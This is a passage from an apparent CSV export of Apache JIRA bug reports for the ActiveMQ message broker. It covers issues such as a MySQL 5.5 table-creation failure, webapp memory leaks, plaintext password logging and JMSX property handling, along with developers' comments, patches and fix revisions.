        at org.apache.activemq.store.kahadb.MessageDatabase.removeAckLocation(MessageDatabase.java:1314)
        at org.apache.activemq.store.kahadb.MessageDatabase.updateIndex(MessageDatabase.java:891)
        at org.apache.activemq.store.kahadb.MessageDatabase.access$700(MessageDatabase.java:82)
        at org.apache.activemq.store.kahadb.MessageDatabase$13.execute(MessageDatabase.java:757)
        at org.apache.kahadb.page.Transaction.execute(Transaction.java:728)
        at org.apache.activemq.store.kahadb.MessageDatabase.process(MessageDatabase.java:755)
        at org.apache.activemq.store.kahadb.MessageDatabase$11.visit(MessageDatabase.java:700)
        at org.apache.activemq.store.kahadb.data.KahaRemoveMessageCommand.visit(KahaRemoveMessageCommand.java:220)
        at org.apache.activemq.store.kahadb.MessageDatabase.process(MessageDatabase.java:692)
        at org.apache.activemq.store.kahadb.MessageDatabase.store(MessageDatabase.java:644)
        at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBTopicMessageStore.acknowledge(KahaDBStore.java:316)
        at org.apache.activemq.broker.region.Topic.acknowledge(Topic.java:466)
        at org.apache.activemq.broker.region.DurableTopicSubscription.acknowledge(DurableTopicSubscription.java:230)
        at org.apache.activemq.broker.region.PrefetchSubscription.acknowledge(PrefetchSubscription.java:255)
        at org.apache.activemq.broker.region.AbstractRegion.acknowledge(AbstractRegion.java:373)
        at org.apache.activemq.broker.region.RegionBroker.acknowledge(RegionBroker.java:470)
        at org.apache.activemq.broker.BrokerFilter.acknowledge(BrokerFilter.java:74)
        at org.apache.activemq.broker.TransactionBroker.acknowledge(TransactionBroker.java:194)
        at org.apache.activemq.broker.BrokerFilter.acknowledge(BrokerFilter.java:74)
        at org.apache.activemq.broker.BrokerFilter.acknowledge(BrokerFilter.java:74)
        at org.apache.activemq.broker.MutableBrokerFilter.acknowledge(MutableBrokerFilter.java:85)
        at org.apache.activemq.broker.TransportConnection.processMessageAck(TransportConnection.java:459)
        at org.apache.activemq.command.MessageAck.visit(MessageAck.java:205)
        at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:303)
        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:181)
        at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)
        at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113)
        at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:216)
        at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:84)
        at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:205)
        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:187)
        at java.lang.Thread.run(Thread.java:619){code};;;","09/Aug/10 16:25;chirino;fixed in rev 983672;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Composite destinations doesn't update CursorMemoryUsage appropriately ,AMQ-2861,12481867,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,dejanb,dejanb,04/Aug/10 16:14,04/Aug/10 16:16,14/Jul/23 05:43,04/Aug/10 16:16,5.3.2,,,,,5.4.0,,,,,,,0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74774,,,Wed Aug 04 16:16:47 UTC 2010,,,,,,,,,,,"0|i0rqnz:",159964,,,,,,,,,,,,,,,,,,,,,"04/Aug/10 16:16;dejanb;Fixed with svn revision 982317;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ConnectionInfo does not override toString to stop logging actual Password in case of Warning. ,AMQ-2858,12483481,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Critical,Fixed,,kamaldalal,kamaldalal,03/Aug/10 17:09,29/Jun/11 22:22,14/Jul/23 05:43,29/Jun/11 22:22,5.3.0,,,,,5.3.1,,,Broker,,,,0,,,,,,,,,"In case of exception as shown below, the ConnectionInfo logged as warning which logs Password in plain Text. Should have encrypted or log as XXXX or YYYY ... 

If ConnectionInfo override the BaseCommand's toString(Map<String, Object>overrideFields) method and set Password as XXXXX... this would be better handled. 

WARN  org.apache.activemq.broker.TransportConnection.Service [ActiveMQ Transport Stopper: /134.42.197.187:2512] - Failed to remove connection ConnectionInfo {commandId = 1, responseRequired = true, connectionId = 4a6df719-b8ed-4431-a97f-52b93078f021, clientId = 2061e6c0-f8e0-4882-860c-89c3fd7e36db, userName = YYYYX *password = X2342$*, brokerPath = null, brokerMasterConnector = false, manageable = false, clientMaster = true}
java.lang.SecurityException: User is not authenticated.
	at org.apache.activemq.security.AuthorizationBroker.addDestination(AuthorizationBroker.java:52)
	at org.apache.activemq.broker.MutableBrokerFilter.addDestination(MutableBrokerFilter.java:149)
	at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:425)
	at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:224)
	at org.apache.activemq.advisory.AdvisoryBroker.fireAdvisory(AdvisoryBroker.java:439)
	at org.apache.activemq.advisory.AdvisoryBroker.fireAdvisory(AdvisoryBroker.java:369)
	at org.apache.activemq.advisory.AdvisoryBroker.fireAdvisory(AdvisoryBroker.java:364)
	at org.apache.activemq.advisory.AdvisoryBroker.removeConnection(AdvisoryBroker.java:223)
	at org.apache.activemq.broker.BrokerFilter.removeConnection(BrokerFilter.java:110)
	at org.apache.activemq.broker.BrokerFilter.removeConnection(BrokerFilter.java:110)
	at org.apache.activemq.broker.BrokerFilter.removeConnection(BrokerFilter.java:110)
	at org.apache.activemq.broker.MutableBrokerFilter.removeConnection(MutableBrokerFilter.java:117)
	at org.apache.activemq.broker.TransportConnection.processRemoveConnection(TransportConnection.java:709)
	at org.apache.activemq.broker.TransportConnection.doStop(TransportConnection.java:976)
	at org.apache.activemq.broker.jmx.ManagedTransportConnection.doStop(ManagedTransportConnection.java:71)
	at org.apache.activemq.broker.TransportConnection$3.run(TransportConnection.java:907)
",Linux,kamaldalal,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,69674,,,Wed Jun 29 22:22:24 UTC 2011,,,,,,,,,,,"0|i0rzvj:",161456,Regression,,,,,,,,,,,,,,,,,,,,"12/Oct/10 09:29;dejanb;This sounds like a duplicate of https://issues.apache.org/activemq/browse/AMQ-2499 and should be fixed in later versions;;;","13/Oct/10 00:12;kamaldalal;This is different than https://issues.apache.org/activemq/browse/AMQ-2499

The exception is logged at WARN level with password in plain text. 

;;;","29/Jun/11 22:22;tabish;Fixed by AMQ-2499

The IntrospectionSupport class maps all properties named ""password"" to 'XXXX';;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ActiveMQ fails to create tables in MySQL 5.5.5,AMQ-2857,12482192,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,gtully,matthewj,matthewj,02/Aug/10 14:18,13/Aug/10 19:34,14/Jul/23 05:43,13/Aug/10 10:24,5.3.2,,,,,5.4.1,,,,,,,0,,,,,,,,,"Running an embedded ActiveMQ database, using MySQL as the JDBC data source worked fine under MySQL 5.4.  After upgrading to MySQL 5.5.5, ActiveMQ works fine as long as the three required tables in the activemq database already exist (activemq_acks, activemq_lock, activemq_msgs).  However, if they don't exist, it fails to create the tables, whereas the tables would be automatically created under MySQL 5.4.

The problem appears to be in the create table script that's used.  In previous versions of MySQL, it was legal (though deprecated as of 4.1) to specify the engine using the ""TYPE=INNODB"" syntax.  The preferred non-deprecated way to do it was to use ""ENGINE=INNODB"" instead.  Under 5.5.5, it appears that the ""TYPE"" syntax is now completely illegal, requiring use of the ""ENGINE"" syntax instead.

A relevant MySQL bug discussing the issue: http://bugs.mysql.com/bug.php?id=17501

The following is an example of the actual SQL that is generated by ActiveMQ:

CREATE TABLE ACTIVEMQ_MSGS(ID BIGINT NOT NULL, CONTAINER VARCHAR(250),
MSGID_PROD VARCHAR(250), MSGID_SEQ BIGINT, EXPIRATION BIGINT, MSG LONGBLOB, PRIMARY KEY ( ID ) ) TYPE=INNODB

I have not yet tested it, but it seems likely that the culprit is MySqlJDBCAdapter.java.  It includes the line:

String typeClause = "" TYPE=""+type;

which should probably change to

String typeClause = "" ENGINE=""+type;",MySQL 5.5.5,matthewj,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"12/Aug/10 22:19;matthewj;mysqlpatch.txt;https://issues.apache.org/jira/secure/attachment/12461796/mysqlpatch.txt",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74775,,,Fri Aug 13 19:34:53 UTC 2010,,,,,,,Patch Available,,,,"0|i0rpjz:",159784,,,,,,,,,,,,,,,,,,,,,"12/Aug/10 22:19;matthewj;Attaching patch file which fixes MySqlJDBCAdapter.java.  Tested this locally, and it did appear to fix the issue.;;;","13/Aug/10 10:24;gtully;variant of patch applied in r985151
added typeStatement attribute to make this configurable for backwards compatibility, default to new ENGINE statement so it will work out of the box with MySQL 5.5
Tanks for the patch. Would be great if you could validate a 5.5 snapshot over the next few days.;;;","13/Aug/10 19:34;matthewj;Downloaded the latest snapshot, and it does appear to be working correctly for me.

One thing I noticed in the class was that the ""ENGINE"" string is still being used directly when using NDBCLUSTER:

{code}           
l.add(""ALTER TABLE ""+statements.getFullMessageTableName()+"" ENGINE=""+NDBCLUSTER);
l.add(""ALTER TABLE ""+statements.getFullAckTableName()+"" ENGINE=""+NDBCLUSTER);
l.add(""ALTER TABLE ""+statements.getFullLockTableName()+"" ENGINE=""+NDBCLUSTER);
{code}

It looks like NDBCLUSTER was added in MySQL 5.x, so the ENGINE statement will always be correct in the MySQL versions that support it.    It just looks strange that we're using the ""typeStatement"" variable in some cases but not in others.  Would it be worth changing these lines as well merely for the sake of consistency?;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
m2eclipse fails to update maven project configuration,AMQ-2856,12482351,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,norman,norman,02/Aug/10 06:02,09/Aug/10 09:08,14/Jul/23 05:43,09/Aug/10 09:08,,,,,,5.4.0,,,,,,,0,,,,,,,,,"If you try to ""Update Project Configuration"" via m2eclipse plugin you see the following error:

[ERROR] 'dependencies.dependency.(groupId:artifactId:type:classifier)' must be unique: org.osgi:org.osgi.core:jar -> duplicate declaration of version (?) @ org.apache.activemq:apache-activemq:5.4-SNAPSHOT, /home/maurer/workspace2/activemq-trunk/assembly/pom.xml

This is caused because the dependecy of org.osgi.core is specified two times (with different qualifiers). m2eclipse is really strict on that.","ubuntu 10.4, java6, eclipse 3.4, m2eclipse  0.10.2.20100623-1649",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"02/Aug/10 06:02;norman;activemq-assembly-pom.diff;https://issues.apache.org/jira/secure/attachment/12461791/activemq-assembly-pom.diff",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,38758,,,Mon Aug 09 09:08:28 UTC 2010,,,,,,,Patch Available,,,,"0|i0rqon:",159967,,,,,,,,,,,,,,,,,,,,,"02/Aug/10 06:02;norman;This patch fix the issue;;;","09/Aug/10 09:08;dejanb;OSGi dependency removed altogether as it's not included in the distro anymore.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Memory leak when undeploying webapp with ActiveMQ client,AMQ-2852,12483952,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,daniel.spilker@hamburg.de,daniel.spilker@hamburg.de,28/Jul/10 16:01,15/Aug/11 10:47,14/Jul/23 05:43,23/Mar/11 16:37,5.3.2,,,,,5.5.0,,,Transport,,,,11,,,,,,,,,"I have a web app with an ActiveMQ client. When undeploying the app, Tomcat logs the following messages.

{code}
28.07.2010 17:44:28 org.apache.catalina.loader.WebappClassLoader clearReferencesThreads
SCHWERWIEGEND: The web application [] appears to have started a thread named [InactivityMonitor Async Task: java.util.concurrent.ThreadPoolExecutor$Worker@c821ef] but has failed to stop it. This is very likely to create a memory leak. 
28.07.2010 17:44:28 org.apache.catalina.loader.WebappClassLoader clearReferencesThreads
SCHWERWIEGEND: The web application [] appears to have started a thread named [TcpSocketClose: java.util.concurrent.ThreadPoolExecutor$Worker@19ac2e3] but has failed to stop it. This is very likely to create a memory leak. 
{code}

Searching for ""InactivityMonitor Async Task"" and ""TcpSocketClose"", I found org.apache.activemq.transport.tcp.TcpTransport and org.apache.activemq.transport.InactivityMonitor which both start a ThreadPoolExecutor in their static intializers but never stop them. The ThreadPoolExecutors hold references to ActiveMQ classes which hold a reference to the webapp classloader. These references prevent the webapp classes from being unloaded when the webapp is undeployed. Due to this the servlet container runs out of memory after a few redeployments.

The ActiveMQ client should dispose all resources when being closed, including the ThreadPoolExecutors. Or to provide some methods to explicitly stop these Threads (like org.apache.activemq.thread.Scheduler.shutdown() does).",,coderman,daniel.spilker@hamburg.de,danttran,henryju,javich,mikewhit,sslavic,timezra,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-3451,,,,,,,,AMQ-2138,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14610,,,Mon Aug 15 10:44:30 UTC 2011,,,,,,,,,,,"0|i0akdr:",59575,,,,,,,,,,,,,,,,,,,,,"23/Sep/10 09:18;henryju;I still have this issue with ActiveMQ 5.4.1.;;;","14/Dec/10 10:44;coderman;The same with 5.4.2;;;","14/Dec/10 10:50;coderman;here is the log output:

SEVERE: The web application [/webapp] appears to have started a thread named [AMQPersistenceAdaptor Task] but has failed to stop it. This is very likely to create a memory leak.
Dec 14, 2010 11:22:37 AM org.apache.catalina.loader.WebappClassLoader clearReferencesThreads
SEVERE: The web application [/webapp] appears to have started a thread named [VMTransport] but has failed to stop it. This is very likely to create a memory leak.
Dec 14, 2010 11:22:37 AM org.apache.catalina.loader.WebappClassLoader clearReferencesThreads
SEVERE: The web application [/webapp] appears to have started a thread named [VMTransport] but has failed to stop it. This is very likely to create a memory leak.
Dec 14, 2010 11:22:37 AM org.apache.catalina.loader.WebappClassLoader clearReferencesThreads
SEVERE: The web application [/webapp] appears to have started a thread named [VMTransport] but has failed to stop it. This is very likely to create a memory leak.
Dec 14, 2010 11:22:37 AM org.apache.catalina.loader.WebappClassLoader clearReferencesThreads
SEVERE: The web application [/webapp] appears to have started a thread named [ActiveMQ Task] but has failed to stop it. This is very likely to create a memory leak.
Dec 14, 2010 11:22:37 AM org.apache.catalina.loader.WebappClassLoader clearThreadLocalMap;;;","14/Dec/10 17:29;gtully;resolve client side issues in r1049184
addition of org.apache.activemq.thread.DefaultThreadPools#shutdown to allow the default pool to be shutdown on undeploy.;;;","15/Dec/10 12:45;gtully;additional broker improvements in r1049527 - have discovery agent and network connector delegate to the common pool that can be explicitly shutdown.;;;","15/Dec/10 17:26;gtully;still seems to be an issue with the amq persistence adapter{code}SEVERE: The web application [/web-app] appears to have started a thread named [AMQPersistenceAdaptor Task] but has failed to stop it. This is very likely to create a memory leak.{code};;;","23/Mar/11 16:37;gtully;fixed up AMQStore piece in revision - http://svn.apache.org/viewvc?rev=1084633&view=rev;;;","24/Jul/11 21:24;danttran;I am using AMQ 5.5 using embedded mode with no persistent listening for external producer connectors and consumed via VM connector. Still see the issue

turn on persistent still see the issue ( <amq:broker useJmx=""true"" persistent=""true"" advisorySupport=""false""> )

SEVERE: The web application [/mc] appears to have started a thread named [ActiveMQ Task-20] but has failed to stop it. This is very likely to create a memory leak.

Any suggestion?;;;","15/Aug/11 10:44;beowulf;The bug persists in ActiveMQ 5.5, I have created a new issue https://issues.apache.org/jira/browse/AMQ-3451.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Apache Camel Activemq component does not allow use of ""consumer.retroactive=true""",AMQ-2846,12482673,,Bug,Closed,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,futant23,futant23,22/Jul/10 13:18,20/Sep/11 11:01,14/Jul/23 05:43,20/Sep/11 11:01,5.3.2,,,,,5.6.0,,,,,,,1,,,,,,,,,"I am not entirely certain if this belongs here or in Camel, but use of the parameter""...?consumer.retroactive=true"" while using the Activemq component in camel throws the following:

Failed to resolve endpoint: activemq://topic:foo.bar?consumer.retroactive=true due to: There are 1 parameters that couldn't be set on the endpoint. Check the uri if the parameters are spelt correctly and that they are properties of the endpoint. Unknown parameters=[{consumer.retroactive=true}]

Excerpt from dsl:
<camelContext xmlns=""http://camel.apache.org/schema/spring"">
		<route>
			<from uri=""activemq:topic:foo.bar?consumer.retroactive=true"" />

It seems odd that this would be left out.
",,futant23,jwatkins,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,60048,,,Tue Sep 20 11:01:36 UTC 2011,,,,,,,,,,,"0|i0akdz:",59576,,,,,,,,,,,,,,,,,,,,,"22/Jul/10 17:10;futant23;Initial indications seem to suggest this might work.

<bean id=""jmsFactory"" class=""org.apache.activemq.ActiveMQConnectionFactory"">
		<property name=""brokerURL"">
			<value>failover://(tcp://localhost:61616)</value>
		</property>	
		<property name=""useRetroactiveConsumer"">
			<value> true </value>
		</property>	
	</bean>


Still it would be better (IMO) that this be able to use as suggested above as a parameter.

-Brian
;;;","14/Sep/11 21:56;tabish;Duplicate of AMQ-3498.  Fixed;;;","20/Sep/11 10:56;gtully;reopen to set fix version to 5.6;;;","20/Sep/11 11:01;gtully;closing again with correct fix version;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
JMSX Properties not returned from message.propertyExists() and message.getPropertyNames(),AMQ-2840,12483498,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,andriyhnativ,andriyhnativ,20/Jul/10 14:57,07/Sep/10 12:34,14/Jul/23 05:43,30/Aug/10 15:46,5.4.0,,,,,5.4.1,,,Broker,,,,1,,,,,,,,,"Methods propertyExists() and getPropertyNames() defined in the class org.apache.activemq.command.ActiveMQMessage (activemq-core) return only custom properties. The JMSX properties (like JMSXDeliveryCount) are not being returned. This problem exists not only for a new version of ActiveMQ (5.4), but also for 5.3 (and probably for others as well).",,andriyhnativ,rodos77,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"20/Jul/10 15:00;andriyhnativ;patch.txt;https://issues.apache.org/jira/secure/attachment/12461771/patch.txt",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14794,,,Tue Sep 07 12:34:42 UTC 2010,,,,,,,,,,,"0|i0ba5j:",63757,Regression,,,,,,,,,,,,,,,,,,,,"20/Jul/10 15:00;andriyhnativ;The patch;;;","03/Aug/10 20:07;rodos77;Any way this fix can be included in 5.4.0?  This seems like a glaring omission of very basic functionality and the fix looks simple enough.;;;","09/Aug/10 09:14;gtully;patch applied in r983564 with thanks. added a test to keep the changes safe!;;;","19/Aug/10 04:55;genspring;Hi, this patch broke the jms spec:

-----------------------------------------------------------------------------------------------
/**Returns an Enumeration of all the property names. 
** Note that *JMS standard header fields are not considered properties and are not returned in this enumeration*. 
**/
Enumeration getPropertyNames()  throws JMSException
----------------------------------------------------------------------------------------------------

So that this change is preventing the tck from passing.    Could you please fix this ?  
;;;","19/Aug/10 09:02;gtully;pending spec compliance issue - part of this patch needs to be reverted.;;;","19/Aug/10 09:07;gtully;reverted the non jms spec compliant part of the patch in r987090;;;","19/Aug/10 14:50;genspring;I found that the version of trunk is 5.5-SNAPSHOT.    Are you planing to release a 5.4.1 to fix this ?

In my opinion,  a 5.4.1 with fix should be released ASAP because the user's JMS code based on the wrong implementation will not be portable.
;;;","19/Aug/10 14:52;rodos77;Guys, let's read the JMS spec carefully:

The spec says that the following are standard header fields (starting with ""JMS"" prefix):
JMSDestination
JMSDeliveryMode
JMSExpiration
JMSPriority
JMSMessageID
JMSTimestamp
JMSCorrelationID
JMSReplyTo
JMSType
JMSRedelivered

However, the following are NOT header fields but are JMS Defined *_Properties_* (starting with ""JMSX"" prefix):
JMSXUserID
JMSXAppID
JMSXDeliveryCount
JMSXGroupID
JMSXGroupSeq
JMSXProducerTXID
JMSXConsumerTXID
JMSXRcvTimestamp
JMSXState

Of these, it looks like AMQ supports 3: JMSXDeliveryCount, JMSXGroupID and JMSXGroupSeq.  Now, the ActiveMQMessage class puts both the JMS header fields and the JMSX message properties into the same JMS_PROPERTY_SETERS map, so i agree, returning the whole map is wrong, but the JMSX properties MUST still be returned.

So I think the proper solution is to replace the (reverted) line:
{code}
result.addAll(new Vector<String>(JMS_PROPERTY_SETERS.keySet()));
{code}
with something like:
{code}
for (String propName : JMS_PROPERTY_SETERS.keySet()) {
    if (propName.startsWith(""JMSX"")) {
        propsVector.add(propName);
    }
}
{code}
;;;","19/Aug/10 15:34;gtully;Eugene, that seems correct, have made is so JMSX props are returned. r987193

Shawn, will this pass the tck?

As to a 5.4.1 asap, I agree it is a portability issue, but one few people are likely to encounter. Lets see what others think.;;;","20/Aug/10 02:45;kevan;In Geronimo, we've been lining up our next 2.2.x release to be based on 5.4.0. With the limited time between this regression and release, we weren't able to nail down the cause of this problem (we had made connector/transaction manager updates around the same time, which could have had some impact on our JMS tests).

So, I, for one, would be interested in a 5.4.1 release ""soon"".;;;","20/Aug/10 07:46;genspring;Gary,  #987193  bring the same TCK Failures.    Could you revert them ?;;;","20/Aug/10 09:57;gtully;I reverted the changes so the TCK will pass. I added a new method, getAllPropertyNames() that returns all the properties, JMS standard props and JMSX extension props, so folks who want this non standard behavior can have it in an explicitly non portable way.

My bad on this late change, not sure it would have been avoided if I validated against the spec though, I would have taken Eugene's interpretation.

What is the expected drop date for Geronimo, it makes sense to cut a new release for the next 2.2.x release. Think it may also makes sense to wait some time to ensure there are no other must fix issues.
;;;","20/Aug/10 13:21;kevan;Shawn, thanks for running those tests!

We're also waiting for an Axis release. But I'm hoping for a mid-September release. So, a 5.4.1 in 2-3 weeks should work. ;;;","30/Aug/10 15:46;gtully;resolving this. It may make sense to validate tck again, just to be sure to be sure.;;;","07/Sep/10 12:34;rickmcguire;The axis2 release we're waiting on for the Geronimo release has finally gone to a vote.  We're going to be needed the 5.4.1 release shortly too.  The snapshot version has been looking good with the TCK. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Memory Leak when using ConnectionConsumer and a Persistent Broker,AMQ-2838,12482729,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,rajdavies,rodos77,rodos77,19/Jul/10 22:10,20/Jul/10 00:13,14/Jul/23 05:43,20/Jul/10 00:13,5.3.1,,,,,5.4.0,,,Broker,,,,0,,,,,,,,,"I found a memory leak in ActiveMQ when using an embedded broker with persistence (enabled by default) and using the connection to create a ConnectionConsumer.  The memory leak occurs after performing the following steps:

1. acquire a Connection (ActiveMQConnection) from a ConnectionFactory (ActiveMQConnectionFactory)
2. use the Connection to create a ConnectionConsumer
3. close the ConnectionConsumer
4. close the Connection
5. repeat steps 1 and 4 from above

The memory leak is in org.apache.activemq.thread.Scheduler.  After the last connection is closed, the embedded broker is shutdown.  When this happens all AMQ threads are killed except for the ""ActiveMQ Scheduler"" thread.  This is a Timer that contains a queue of scheduled tasks.  If no brokers are running, this queue should be empty.  In fact if persistence is turned off on the broker, the queue is correctly emptied after the last connection is closed.  However, with persistence on, the queue does not get emptied completely.

The memory leak is directly proportional to the number of ConnectionConsumers that are created on the connection.  That is, the more ConnectionConsumers are created, the more tasks will remain on the Scheduler's task queue after the connection is closed.

In our test environment, we create many ConnectionConsumer objects for each test and run many such tests.  The memory leak accumulates quickly and we soon get an OutOfMemoryException.

I'm attaching a junit test that illustrates the problem.  The NUM_OF_CYCLES and NUM_OF_CONNECTION_CONSUMERS constants can be increased to see how the memory leak grows with increased number of iterations and ConnectionConsumer objects created, respectively.  Also, persistence can be turned off on the broker url to see that the test succeeds in that case (i.e. no RAM leak).",,rodos77,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"19/Jul/10 22:12;rodos77;ConnectionConsumerMemoryLeakTest.java;https://issues.apache.org/jira/secure/attachment/12461770/ConnectionConsumerMemoryLeakTest.java",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74777,,,Tue Jul 20 00:13:12 UTC 2010,,,,,,,,,,,"0|i0rq3r:",159873,,,,,,,,,,,,,,,,,,,,,"20/Jul/10 00:13;rajdavies;The use of static classes (like Scheduler) is no longer used in ActiveMQ to prevent problems like this;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ConcurrentModificationException while sending messages to composite destinations,AMQ-2836,12482715,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Critical,Fixed,gtully,hadrian,hadrian,19/Jul/10 14:37,19/Jul/10 15:00,14/Jul/23 05:43,19/Jul/10 15:00,5.3.1,,,,,5.4.0,,,,,,,0,,,,,,,,,"When the LoggingBrokerPlugin is used and sending messages to composite destinations there is a very high amount of ConcurrentModificationException on the broker.

